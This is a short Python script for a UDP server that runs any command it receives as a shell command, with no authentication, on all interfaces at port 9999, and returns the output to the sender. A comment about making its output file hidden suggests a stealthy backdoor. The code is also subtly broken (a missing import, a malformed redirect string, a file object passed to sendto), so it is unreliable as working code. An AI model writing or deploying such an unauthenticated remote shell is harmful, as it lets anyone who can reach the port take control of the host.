#udpserver //command runner as well

import socketserver
import subprocess as sub
import os # might have to use a replacement to subprocess
#dir 2>&1 > a.txt redirecting stdout

def save_command(command,save_name):
	os.system(command+"2>&1 >"+save_name) #make this file hidden later
	sleep(2) # have to figure out to just check for the completetion of the process instead
	stdout = open(save_name)
	os.remove(save_name)
	return stdout

def invoke(command):
	# invoke a command and return the output
    return sub.Popen(command, stdout=sub.PIPE, shell=True).stdout.read()

class UDPHandler(socketserver.BaseRequestHandler):

	def handle(self):
		commandToRun = self.request[0].strip()
		socket = self.request[1]
		print("{} sent:".format(self.client_address[0]))
		print(commandToRun)
		socket.sendto(save_command(commandToRun,"out.txt"), self.client_address)

def main():
	HOST, PORT = "0.0.0.0",9999 # need to change this to bind all interfaces
	server = socketserver.UDPServer((HOST,PORT),UDPHandler)
	server.serve_forever()

if __name__=="__main__":
	main()
